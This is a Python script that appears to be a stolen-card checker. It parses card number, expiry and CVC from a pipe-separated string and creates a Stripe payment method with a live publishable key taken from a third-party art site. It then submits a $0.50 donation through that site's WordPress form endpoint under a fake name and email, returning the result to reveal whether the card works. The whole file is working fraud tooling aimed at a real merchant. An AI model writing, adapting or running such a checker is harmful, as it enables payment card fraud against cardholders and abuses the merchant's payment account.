import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F9e39ef88d1%3B+stripe-js-v3%2F9e39ef88d1%3B+card-element&key=pk_live_51QjxIJBIAegPUdNnNFR7TFG4bcuRjHGbZHEqfNdkQK2Th5U5dWZknXZgul0IBeTHloQPDdJe6d2cYcv1brokEM7n00KZMj6crx'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'johnbrain.art',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://johnbrain.art',
	    'referer': 'https://johnbrain.art/tutorials/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1746937202174',
	}
	
	data = {
	    'data': f'item_6__fluent_sf=&__fluent_protection_token_6=8%2BbHC0%2Byy4YWRQcm5pSWieEaiq%2Faa1X1r3OcfBBnaPNMufef4L4EPOgwqhCbezi1ps%2Fm9P8KcGV%2FYlM47d3I%2Fvgdj%2FE3iDjzqy4YvaO8pB7vUDdA5dAR9rnEIiK0iIoP&__fluent_form_embded_post_id=1282&_fluentform_6_fluentformnonce=4ec45b5356&_wp_http_referer=%2Ftutorials%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&phone=&How_Would_You_Like_to_Read_=&custom-payment-amount=0.50&payment_method=stripe&Additional_Message=&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '6',
	}
	
	response = requests.post('https://johnbrain.art/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)
	
	return (response.text)
